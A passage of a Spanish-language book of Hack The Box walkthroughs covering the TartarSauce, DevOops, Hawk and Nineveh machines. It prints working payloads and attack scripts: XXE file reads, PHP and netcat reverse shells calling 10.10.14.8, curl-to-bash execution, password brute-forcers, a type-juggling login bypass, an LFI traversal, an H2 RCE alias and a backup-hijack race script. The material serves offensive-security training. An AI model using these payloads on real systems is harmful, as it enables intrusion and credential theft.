ls /var/spool/cron/ -l
```

Bueno aqui no se ve nada, no tenemos permisos SUID no hay nada vemos tareas cron. Pero siempre se puede ver de forma alternativa si hay tareas 
que se ejecutan a intervalo regular de tiempo.

```bash
cd /dev/shm
touch procmon.sh
chmod +x procmon.sh
nano procmon.sh
```

Aqui nos creamos el script que nos servira de monitoreo de procesos.

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
    old_process=$new_process
done
```

Ya podemos ver que hay una tarea `/bin/bash /usr/sbin/backuperer` que se ejecuta a intervalos regulares de tiempo. lo Analizamos.

```bash
cat /usr/sbin/backuperer
```

Aqui vemos un script que:

1. supprime ficheros `/var/tmp/.*` 
1. supprime el directorio `/var/tmp/check`
1. comprime todo lo que hay en `/var/www/html` como un fichero `/var/tmp/.<hash>`
1. sleep 30
1. crea un directorio `/var/tmp/check`
1. descomprime `/var/tmp/.<hash>` en `/var/tmp/check`
1. controla si hay una differencia entre el contenido del hash y `/var/www/html`
1. si hay differencias, reporta los cambios en el fichero `/var/backup/onuma_backup_error.txt`

La vulnerabilidad de este script reside en el sleep de 30 secundos que nos permitiria borrar el fichero comprimido `.<hash>` y meter
otro comprimido. Como suponemos que es **root** que ejecuta la tarea, podemos aprovechar de esto para ver la flag de root.

#### Modificacion del comprimido {-}

1. Creamos un comprimido de `/var/www/html`

    ```bash
    cd /dev/shm
    tar -zcvf comprimido.tar /var/www/html
    ```

1. Preparamos en la maquina de atacante para recibir el comprimido

    ```bash
    nc -nlvp 443 > comprimido.tar
    ```

1. Enviamos el comprimido desde la maquina victima

    ```bash
    nc 10.10.14.8 443 < comprimido.tar
    ```

Ahora que tenemos el comprimido en la maquina de atacante, vamos a cambiar su contenido

1. descomprimimos el ficher `.tar`

    ```bash
    tar -xf comprimido.tar
    ```

1. Modificamos el ficher `index.html`

    ```bash
    cd var/www/html
    rm index.html
    ln -s -f /root/root.txt index.html
    ```

1. creamos un nuevo comprimido

    ```bash
    cd ../../..
    tar -zcvf comprimido.tar var/www/html
    ```

1. enviamos el comprimido a la maquina victima

    - en la maquina de atacante

        ```bash
        python3 -m http.server 80
        ```

    - en la maquina victima

        ```bash
        wget http://10.10.14.8/comprimido.tar
        ```

1. creamos un script para ejecutar el secuestro

    ```bash
    touch tehijackeolavida.sh
    chmod +x tehijackeolavida.sh
    nano tehijackeolavida.sh
    ```

    que contiene

    ```bash
    #!/bin/bash

    while true; do
        filename=$(ls -ls /var/tmp/ | awk 'NF{print $NF}' | grep -oP '^\..*[a-f0-9]')

        if [ $filename ]; then
            ehco -e "\n[+] El nombre de archivo es $filename\n"
            rm /var/tmp/$filename
            cp comprimido.tar /var/tmp/$filename
            echo -e "\n[+] Archivo hijiackeado con exito\n"
            exit 0
    done
    ```

1. Ejecutamos el script 

    ```bash
    ./tehijackeolavida.sh
    ```

Cuando la pantalla nos muestre el mensaje `[+] Archivo hijackeado con exito`, podemos mirar el fichero `/var/backup/onuma_backup_error.txt` 
y 30 segundos mas tarde tendriamos que ver la flag.

```bash
while true; do cat /var/backup/onuma_backup_error.txt ; sleep 1; clear; done
```

Ya podemos ver la flag.

### Rootear la maquina de verdad {-}

Podríamos crear un binario en C con SUID para que lo deposite root en html, lo que nos permitiria rootear la maquina.

<!--chapter:end:12-TartarSauce/12-04-PrivilegeEscalation.Rmd-->

# DevOops {-}

## Introduccion {-}

La maquina del dia 05/08/2021 se llama DevOops
.

El replay del live se puede ver aqui

[![S4vitaar Tartar Sauce maquina](https://img.youtube.com/vi/NGNca3P9Tec/0.jpg)](https://www.youtube.com/watch?v=NGNca3P9Tec)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:13-DevOops/13-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.91
```
ttl: 63 -> maquina Linux. 
Recordar que en cuanto a ttl se trata 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.91 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,5000 10.10.10.91 -oN targeted
```

| Puerto | Servicio | Que se nos occure? | Que falta?   |
| ------ | -------- | ------------------ | ------------ |
| 22     | ssh      | Acceso directorio  | Credenciales |
| 5000   | http     | Web, fuzzing       |              |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.91:5000
```

Nada muy interesante

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p5000 10.10.10.91 -oN webScan
```

No nos detecta nada

#### Chequear la web por puerto 5000 {-}

Con firefox navegamos en la web para ver lo que es. 

- Under construction
- la web es una simple imagen
- hablan de `.py`
- vemos usuarios

Como no hay nada interesante vamos a por WFUZZ

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.91:5000/FUZZ
```

Encontramos una ruta `/feed` y `/upload`. Lo chequeamos en firefox. 

#### Chequeamos la ruta upload {-}

Vemos una pagina que nos permite uploadear ficheros. Parece que tenemos que uploadear ficheros XML que tiene que tener los elementos
siguientes:

- Author
- Subject
- Content

Huele a **XXE** pero primero tratamos de ver si podemos uploadear ficheros de otro tipo.

creamos ficheros

1. fichero **txt**

    ```bash
    vi test.txt

    EEEEEEE
    ```

1. fichero **php**

    ```php
    vi test.php

    <?php
        echo "EEEEEEEEEEE";
    ?>
    ```

Cuando los uploadeamos no se ve nada. No sabemos si la web nos subio los archivos o no. Intentamos con un fichero XML

```xml
vi test.xml

<elements>
    <Author>S4vitar</Author>
    <Subject>EEEEEEEEE</Subject>
    <Content>EEEAEAEAAAEAAEAE</Content>
</elements>
```

Lo uploadeamos y ahora vemos que el Blogpost a sido processado, vemos los elementos **Author** **Subject** **Content** y que lo a guardado en
`/home/roosa/deploy/src` y que la url para **later reference** es `/uploads/test.xml`

Si miramos lo que hay en `http://10.10.10.91:5000/upload/test.xml` vemos el contenido de nuestro fichero XML





<!--chapter:end:13-DevOops/13-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### XXE {-}

Si la web nos reporta el contenido de un campo XML, los attackantes pueden approvechar de una *ENTITY* para remplazar el campo reportado
por el contenido de un fichero interno de la maquina.

En este caso, vemos que el campo **Author** esta reportado en la web y le indicamos que queremos ver el contenido del `/etc/passwd` en su lugar.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<elements>
    <Author>&xxe;</Author>
    <Subject>EEEEEEEEE</Subject>
    <Content>EEEAEAEAAAEAAEAE</Content>
</elements>
```

Uploadeamos el fichero y si vamos en `http://10.10.10.91:5000/upload/nombre-del-fichero.xml` vemos que podemos ver el contenido del `/etc/passwd` de la 
maquina.

Como hemos visto que havia un usuario llamado **roosa**, intentamos ver si tiene un fichero `id_rsa`

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
<elements>
    <Author>&xxe;</Author>
    <Subject>EEEEEEEEE</Subject>
    <Content>EEEAEAEAAAEAAEAE</Content>
</elements>
```

Despues de subir este nuevo fichero podemos ver la id_rsa del usuario roosa.




<!--chapter:end:13-DevOops/13-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Conexion por SSH {-}

Como ya tenemos una id_rsa nos conectaremos como el usuario roosa

```bash
chmod 600 id_rsa
ssh -i id_rsa roosa@10.10.10.91
```

Ya estamos conectados como Roosa y podemos leer la flag.






<!--chapter:end:13-DevOops/13-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
ls -la
id
sudo -l
```

Aqui vemos que el usuario roosa esta en el grupo sudo pero no tenemos su contraseña. Listando los ficheros del usuario **roosa**
vemos que hay muchos ficheros, lo analizamos mas en profundidad.

```bash
find \-type f 2>/dev/null
find \-type f 2>/dev/null | grep -v ".local"
```

Aqui no llama la atencion un directorio que contiene un `.git`. Sabiendo que repositorios **git** contienen un historico de tratamiento
de ficheros nos dirigimos en este proyecto y miramos el historico de comits.

```bash
cd work/blogfeed/
ls -la
git log
```

mirando el historico, vemos un mensaje un poco turbio **reverted accidental commit with proper key**

miramos lo que a passado en este commit. Nos copiamos el identificador del commit.

```bash
git log -p 33e87c312c08735a02fa9c796021a4a3023129ad
```

Aqui vemos que han borrado un key para ponerle otra. La copiamos y de la misma manera que con el usuario roosa, intentamos conectarnos como
root por ssh.

```bash
ssh -i id_rsa2 root@10.10.10.91
```

Y hemos podido entrar... Ya podemos examinar la flag.


<!--chapter:end:13-DevOops/13-04-PrivilegeEscalation.Rmd-->

# Hawk {-}

## Introduccion {-}

La maquina del dia 05/08/2021 se llama Hawk
.

El replay del live se puede ver aqui

[![S4vitaar Hawk maquina](https://img.youtube.com/vi/lL1_9JiUy-k/0.jpg)](https://www.youtube.com/watch?v=lL1_9JiUy-k)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:14-Hawk/14-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.102
```
ttl: 63 -> maquina Linux. 
Recordar que en cuanto a ttl se trata 64 = linux y 128 = windows. 
Pero como estamos en hackthebox el ttl disminuye en una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.102 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,5000 10.10.10.102 -oN targeted
```

| Puerto | Servicio     | Que se nos occure?    | Que falta?   |
| ------ | ------------ | --------------------- | ------------ |
| 21     | ftp          | Accesso por anonymous |              |
| 22     | ssh          | Accesso directorio    | Credenciales |
| 80     | http         | Web, fuzzing          |              |
| 5435   | tcpwrapped   |                       |              |
| 8082   | http         | Web, fuzzing          |              |
| 9092   | XmlIpcRegSvc |                       |              |


### Conneccion como anonymous al servicio FTP {-}

```bash
ftp 10.1.10.102
Name: anonymous
```

Mirando los ficheros con `ls -la` encontramos un fichero oculto llamado `.drupal.txt.enc`. Lo descargamos en nuestra
maquina de atacante.

```bash
ls -la
cd messages
ls -la
get .drupal.txt.enc
```

### Analizando el fichero .drupal.txt.enc {-}

```bash
mv .drupal.txt.enc drupal.txt.enc
cat drupal.txt.enc
```

Aqui vemos que el contenido del fichero esta encodeado en base64.

```bash
cat drupal.txt.enc | xargs | tr -d ' ' | base64 -d; echo
```

Aqui el contenido parece ser un binario. La mejor cosa que hacer en estas situaciones seria guardarlo en un nuevo fichero

```bash
cat drupal.txt.enc | xargs | tr -d ' ' | base64 -d; echo > drupal
rm drupal.txt.enc
mv drupal dupal.txt.crypted
```

Ahora podemos mirar que typo de fichero es.

```bash
cat drupal.txt.crypted
strings drupal.txt.crypted
file drupal.txt.crypted
```

El comando file nos muestra que el fichero a sido encriptado por openssl con una contraseña.

### Desencripcion del fichero drupal.txt.crypted {-}

El problema en este caso es que para leer el fichero necesitamos:

- una contraseña
- el modo de cifrado utlizado para encriptar

Aqui tendriamos que intentar multiples modo de cifrado pero buscando por internet, vemos que el mas comun seria el `aes-256-cbc`

En modo de ejemplo, estas serian la lineas para encriptar y desencriptar un fichero con openssl:

1. Encripcion
    ```bash
    openssl aes-256-cbc -in fichero -out fichero.crypted -k password123
    ```
1. Desencripcion

    ```bash
    openssl aes-256-cbc -d -in fichero.crypted -out fichero -k password123
    ```

La idea aqui es crearnos un script `bruteforce.sh` que nos permite encontrar la contraseña.

<!--chapter:end:14-Hawk/14-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Crack ssl password {-}

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n[!] Saliendo...\n"
    exit 1
}

#Ctrl+C
trap ctrl_c INT

for password in $(cat /usr/share/wordlists/rockyou.txt); do
    openssl aes-256-cvc -d -in drupal.txt.crypted -out drupal.txt -k $password 2>/dev/null

    if [ "$(echo $?)" == "0" ]; then
        echo -e "\n[+] La password es $password\n"
        exit 0
    fi
done
```

Lanzamos el script y vemos la contraseña. Mirando el contenido del ficher drupal.txt vemos un mensaje con una contraseña del portal.


### Analizamos el Portal {-}

Hablando de portal, pensamos en la web. Nmap nos dio 2 puertos donde el servicio es http. el **80** y el **8082**
Con firefox navegamos en la web para ver lo que es. 

- El puerto 80 es el login de la aplicacion drupal
- El puerto 8082 es un H2 Console con una regla **remote connections ('webAllowOthers') are disabled**

Aqui ya pensamos en tecnicas de port forwarding para el puerto 8082 y savemos que tenemos que ir a por el puerto 80.

En el login del puerto 80 intentamos

- admin:admin
- admin:password
- admin:PencilKeyboardScanner123

Y la contraseña que hemos encontrado en el contenido del fichero `drupal.txt` funciona.




<!--chapter:end:14-Hawk/14-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Conexion por Druppal {-}

Para ejecutar comandos o mejor dicho, para ganar accesso al sistema desde un admin panel de drupal siempre es el mismo.

1. En modules, habilitar el componente PHP Filter

    <div class="figure">
    <img src="images/drupal-phpfilter.png" alt="Drupal - habilitar PHP Filter" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-24)Drupal - habilitar PHP Filter</p>
    </div>

1. Crear un nuevo contenido

    <div class="figure">
    <img src="images/drupal-new-article.png" alt="Drupal - Nuevo articulo" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-25)Drupal - Nuevo articulo</p>
    </div>

1. Ponernos en escucha en el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. En drupal añadir en el body

    ```php
    <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f"); ?>
    ```

1. En Text Format le ponemos a **PHP code**
1. Le damos al boton Preview

Ya hemos ganado accesso al sistema como el usuario *www-data*

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Analizamos la maquina {-}

```bash
ls -l
cd /home
ls
cd /daniel
cat user.txt
```

Aqui encontramos un usuario **daniel** y tenemos derechos de escritura. Ya podemos visualizar la flag. Lo mas probable aqui
seria de convertirnos directamente en el usuario root.


<!--chapter:end:14-Hawk/14-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Rootear la maquina {-}

Algo que hemos visto, es que el puerto **8082** no se podia ver por reglas definidas en el sistema.
Como ya hemos pensado en tecnicas de port forwarding, instalamos **Chisel**.

1. Descarga de chisel y build

    ```bash
    git clone https://github.com/jpillora/chisel
    cd chisel
    go build -ldflags "-w -s" .
    upx chisel
    chmod +x chisel
    ```

1. Enviamos chisel a la maquina victima

    - en la maquina de atacante

        ```bash
        python3 -m http.server 80
        ```

    - en la maquina victima

        ```bash
        cd /tmp
        wget http://10.10.14.8/chisel
        chmod +x chisel
        ```

1. En la maquina de atacante creamos un servidor 

    ```bash
    ./chisel server --reverse --port 1234
    ```

1. En la maquina victima creamos un cliente 

    ```bash
    ./chisel client 10.10.14.8:1234 R:8082:127.0.0.1:8082
    ```

Ahora en firefox si vamos a la url `http://localhost:8082` ya podemos ver el contenido de la web.

Si pinchamos en preferencias y despues en **Permitir conexiones desde otros ordenadores** ya podemos navegar desde la
url `http://10.10.10.102:8082`.

Aqui vemos un mensaje Wrong user name or password. Esto puede passar si la **URL JDBC** ya esta en uso. 
si cambiamos la url `jdbc:h2:~/test` por `jdbc:h2:~/EEEEEE` y pinchamos el boton conectar, Entramos en el
panel de control H2 database.

Si en la shell buscamos con el commando `ps -faux` y buscamos el servicio **h2** vemos que el servicio a sido lanzado por
el usuario root. Quiere decir que si ejecutamos commandos desde la consola h2, lo lanzariamos como usuario root.

Buscamos si existe un exploit para H2 console

```bash
searchsploit h2 consola
searchsploit h2 database
```

Encontramos un exploit en python que permitiria ejecutar **Alias Arbitrary Code execution**. Lo analizamos:

```bash
searchsploit -x 44422
```

Mirando el exploit, vemos que tenemos que crear un alias en el cual podemos podemos utilizar para ejecutar commandos. En este caso
no necessitamos utilizar el exploit. Podemos copiar las partes que nos interessa en el panel H2.

```sql
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new \
java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;

CALL EXECVE('whoami')
```

Aqui vemos **root**. Pues aqui lanzamos el commando para que la `/bin/bash` sea SUID

```sql
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new \
java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;

CALL EXECVE('chmod 4755 /bin/bash')
```

En la shell, ya podemos comprobar que la `/bin/bash` es SUID y con el commando `bash -p` no convertimos en root

```bash
ls -l /bin/bash
bash -p
cd /root
cat root.txt
```

Y a estamos root y podemos visualizar la flag.

<!--chapter:end:14-Hawk/14-04-PrivilegeEscalation.Rmd-->

# Nineveh {-}

## Introduccion {-}

La maquina del dia 06/08/2021 se llama Nineveh
.

El replay del live se puede ver aqui

[![S4vitaar Nineveh maquina](https://img.youtube.com/vi/FW0Nj3g4qAk/0.jpg)](https://www.youtube.com/watch?v=FW0Nj3g4qAk)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:15-Nineveh/15-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.43
```
ttl: 63 -> maquina Linux. 
Recordar que en cuanto a ttl respecta 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl 
disminuya en una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.43
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.43 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,443 10.10.10.43 -oN targeted
```

| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 80     | http     | Web, fuzzing       |            |
| 443    | https    | Web, fuzzing       |            |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.43
whatweb https://10.10.10.43
```

Los dos resultados son los mismos y no hay nada muy interesante

#### Chequear la web por comparar los 2 puertos {-}

Con firefox navegamos en la web para ver lo que es. 

- el puerto 80 nos muestra una pagina por defecto
- el puerto 443 nos muestra una webapp con una imagen.

El resultado de los 2 puertos muestran resultados diferentes y parece que la buena web app esta en el puerto 443. Delante de esta situacion,
siempre es interesante mirar lo que hay en el certificado

#### Chequear el contenido de el certificado SSL con openssl {-}

```bash
openssl s_client -connect 10.10.10.43:443
```

vemos una direccion de correo `admin@nineveh.htb` lo que quiere decir que tenemos un usuario y un dominio. 
Como no tenemos mucha mas informacion, vamos a fuzzear la web.

#### Fuzzing con WFuzz {-}

Fuzzeamos el puerto 80

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.43/FUZZ
```

Encontramos una ruta `/department`.

y tambien el puerto 443


```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.43/FUZZ
```

Encontramos una ruta `/db`.

#### Analizamos el directorio department de puerto 80 {-}

Aqui vemos una pagina de Login. El wappalizer no nos muestra algo nuevo. Poniendo como nombre de usuario **admin**, la web
nos señala un mensaje `invalid password` lo que quiere decir que el usuario existe. Vamos a utilizar fuzzing con **BurpSuite**
para encontrar la contraseña del usuario admin.

#### Analizamos el directorio db de puerto 443 {-}

Aqui vemos una pagina de Login para un servicio `phpLiteAdmin` de version **1.9**. Buscamos en internet si hay un default password para este servicio y
efectivamente el default password del servicio es **admin** pero en este caso no funciona.



<!--chapter:end:15-Nineveh/15-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Ataque de tipo intruder con burpsuite para el panel en el puerto 80 {-}

> [ ! ] NOTA: como ya hemos echo este tipo de ataque en la maquina **TheNotebook**, las imagenes que siguen corresponden a la maquina **TheNotebook**. La technica
es exactamente la misma, solo la IP y la url de las imagenes cambian.

1. Creamos un diccionario basado en el rockyou.txt

    ```bash
    cd content
    head -n 10000 /usr/share/wordlists/rockyou.txt > passwords
    ```

1. Desde burpsuite configuramos el scope hacia la url http://10.10.10.43
1. En firefox le ponemos el foxyproxy para el burpsuite
1. Lanzamos una peticion desde login con admin admin y la interceptamos con el burpsuite
1. En burpsuite le damos al `Ctrl+i` para enviarlo al intruder
1. Configuramos el attacker **Sniper** dando la posicion a la palabra password

    <div class="figure">
    <img src="images/notebook-sniper-config.png" alt="nineveh sniper config" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-26)nineveh sniper config</p>
    </div>

1. Cargamos el diccionario creado a la payload list y le quitamos el Payload encoding

    <div class="figure">
    <img src="images/notebook-sniper-list.png" alt="nineveh sniper payload list" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-27)nineveh sniper payload list</p>
    </div>

1. En Options creamos un regexp para saver cuando la contraseña es valida

    - en Grep - Extract damos a ADD
    - le damos a Fetch response y seleccionamos el campo invalid password

        <div class="figure">
        <img src="images/notebook-fetch-response.png" alt="nineveh sniper fetch response" width="90%" />
        <p class="caption">(\#fig:unnamed-chunk-28)nineveh sniper fetch response</p>
        </div>

1. Le damos a start attack

Aqui ya aparece la lista de todo los passwords que burp prueba y vemos una columna donde esta escrito `invalid password`.
lo dejamos un ratito y ya podemos ver que filtrando por esta columna vemos una linea donde no esta escrito esto. Ya tenemos la contraseña.

### Bruteforcear la contraseña con python {-}

Este seria la manera de hacer, lo que hemos echo con Burpsuite pero en python. El script nos viene del compañero s4dbrd.

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal

from pwn import *

# Variables Globales
login_url = 'http://nineveh.htb/department/login.php'


f = open("rockyou.txt", "r")

def def_handler(sig, frame):
    print("\n\nSaliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def bruteForce():
 
    s = requests.Session()

    passwords = f.readlines()
      
    for password in passwords:
        

        login_data = {
            'username': 'admin',
            'password': password.rstrip()
        }

        p1.status("Probando con la contraseña %s" %password)
        r = s.post(login_url, data=login_data)
        
        if 'Invalid Password!' not in r.text:
            p1.success("La contraseña correcta es %s" %password)
            sys.exit(0)

if __name__ == '__main__':

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    bruteForce()
```

### Burlear el login panel con TypeJuggling {-}

Mas tarde en el video, el Tito nos muestra el codigo fuente de la pagina de login y se ve que en la comparativa del input **Password**, el
desarollador de la pagina utiliza un codigo php 

```php
if(isset($_POST['username'] == $USER){
    if(strcmp($_POST['password'], $PASS ) == 0){
        S_SESSION['username'] = $USER;
        header( 'Location: manage.php' );
    }
}
```

El problema aqui es que usado el comando `strcmp()` para el password permite al atacante de burlar esto con un cambio de tipo.

Si la request normal es como la siguiente y nos pone `incorrect password`

```bash
POST /login.php HTTP/1.1
Host: 10.10.10.10
User-Agent: ...
Cookie: PHPSESSID=o36osnz71uw900ln395jhs

username=admin&password=admin
```

cambiandole el payload de la siguiente manera nos loggea sin problema

```bash
POST /login.php HTTP/1.1
Host: 10.10.10.10
User-Agent: ...
Cookie: PHPSESSID=o36osnz71uw900ln395jhs

username=admin&password[]=a
```

El symbolo `[]` cambia el tipo de variable y el `strcmp()` lo acepta. 

### Ataque de tipo intruder con burpsuite para el panel en el puerto 443 {-}

Para el panel de authentification del **phpLiteAdmin**, utilizamos la misma tecnica que para el panel de authentification del puerto 80 (Burpsuite).
De esta manera tambien encontramos la contraseña y nos podemos conectar a la base de datos.

### Bruteforcear la contraseña con python {-}

Este seria la manera de bruteforcear la contraseña con python. Este Script tambien nos viene del compañero s4dbrd.

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from pwn import *

# Variables Globales
login_url = 'https://nineveh.htb/db/index.php'


f = open("rockyou.txt", "r")

def def_handler(sig, frame):
    print("\n\nSaliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def bruteForce():
 
    s = requests.Session()

    passwords = f.readlines()
      
    for password in passwords:
        

        login_data = {
            'password': password.rstrip(),
            'login': "Log+In",
            'proc_login': "true"
        }

        p1.status("Probando con la contraseña %s" %password)
        r = s.post(login_url, data=login_data, verify=False)
        
        if 'Incorrect password.' not in r.text:
            p1.success("La contraseña correcta es %s" %password)
            sys.exit(0)

if __name__ == '__main__':

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)
```

### Analizamos el panel de administracion del puerto 80 {-}

Aqui vemos un link llamado Notes, pinchamos y se ve una nota. 
Nos llama la atencion la url `10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt`
Intentamos ver si es vulnerable a un **LFI**

```bash
10.10.10.43/department/manage.php?notes=files/../../../../../../etc/passwd
10.10.10.43/department/manage.php?notes=files/../../../../../../etc/passwd%00
```

Aqui nos pone la pagina un mensaje `No notes selected`. Probamos mas cosas.

```bash
10.10.10.43/department/manage.php?notes=files/ninevehNotes
10.10.10.43/department/manage.php?notes=files/ninevehNote
```

La differentes respuestas nos hacen pensar que hay un systema de White words list que functionna unicamente si tenemos la palabra
**ninevehNotes**

```bash
10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../../../../../etc/passwd
10.10.10.43/department/manage.php?notes=ninevehNotes/../../../../../../etc/passwd
10.10.10.43/department/manage.php?notes=/ninevehNotes/../etc/passwd
```

Ya podemos ver el contenido del `/etc/passwd` y vemos un usuario **amrois**

Miramos mas contenidos interresantes

### Checkeamos los puertos internos de la maquina {-}

Siempre es buena idea mirrar los puertos internos que estan abiertos. Desde fuera, connocemos los puertos 80 y 443.

1. Approvechamos del LFI para ver el fichero proc tcp

    ```bash
    10.10.10.43/department/manage.php?notes=files/ninevehNotes/../proc/tcp
    ```

1. copiamos esto en un fichero llamado data
1. recuperamos la columna que contiene los puertos

    ```bash
    cat data
    cat data | awk '{print $2}'
    cat data | awk '{print $2}' | grep -v "address"
    cat data | awk '{print $2}' | grep -v "address" | awk '{print $2}' FS=":"
    cat data | awk '{print $2}' | grep -v "address" | awk '{print $2}' FS=":" | sort -u
    ```

Aqui vemos 3 puertos en formato hexadecimal. Lo miramos con python

```python
python3

>>> 0x0016
22
>>> 0x0050
80
>>> 0x01BB
443
```

Ya sabemos ahora que hay el puerto 22 (ssh) que esta abierto internamente.


### Checkeamos las informaciones del usuario amrois {-}

```bash
10.10.10.43/department/manage.php?notes=files/ninevehNotes/../home/amrois/.ssh/id_rsa
10.10.10.43/department/manage.php?notes=files/ninevehNotes/../home/amrois/user.txt
```

No vemos nada. Vamos a ver lo que podemos hacer con la base de datos del puerto 443

### Analyzando la base de datos {-}

```bash
searchsploit phpliteadmin 1.9
```

Aqui vemos un exploit tipo Multiple Vulnerabilities y una Remote PHP Code Injection. Miramos el del RPCI

```bash
searchsploit -x 24044
```

Aqui vemos que si creamos una base de datos, el nombre que entramos sera seguido de la extension apropriada. Un atacante puede
crear una base de datos con una extension php y insertar PHP code para posteriorment ejecutarlo.

<!--chapter:end:15-Nineveh/15-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Conexion desde phpliteadmin {-}

1. Creamos una base de datos llamada hack.php

    <div class="figure">
    <img src="images/phpliteadmin-hack-php.png" alt="create hack.php database" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-29)create hack.php database</p>
    </div>

    Si pinchamos el link de la hack.php database vemos que a sido creado en `/var/tmp/hack.php`

1. Creamos una tabla de una columna que contiene code PHP

    <div class="figure">
    <img src="images/phpliteadmin-create-table.png" alt="create table test" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-30)create table test</p>
    </div>

1. Entramos un comando PHP en la tabla

    <div class="figure">
    <img src="images/phpliteadmin-insert-command.png" alt="insert php command" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-31)insert php command</p>
    </div>

    El comando es `<?php system($_REQUEST["cmd"]); ?>`

1. y con el uso de la LFI miramos lo que passa

    <div class="figure">
    <img src="images/phpliteadmin-rce.png" alt="phpliteadmin RCE" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-32)phpliteadmin RCE</p>
    </div>

Ahora que tenemos posibilidades de ejecutar comandos de manera remota, vamos a tratar de ganar accesso al sistema.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos un archivo *index.html* que contiene

    ```html
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.8/443 0>&1
    ```

1. Compartimos un servidor web con *python*

    ```bash
    python3 -m http.server 80
    ```

1. Lanzamos la reverse shell por la web

    ```bash
    10.10.10.43/department/manage.php?notes=files/ninevehNotes/../var/tmp/hack.php&cmd=curl -s 10.10.14.8|bash
    ```
    
ya hemos ganado accesso al sistema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

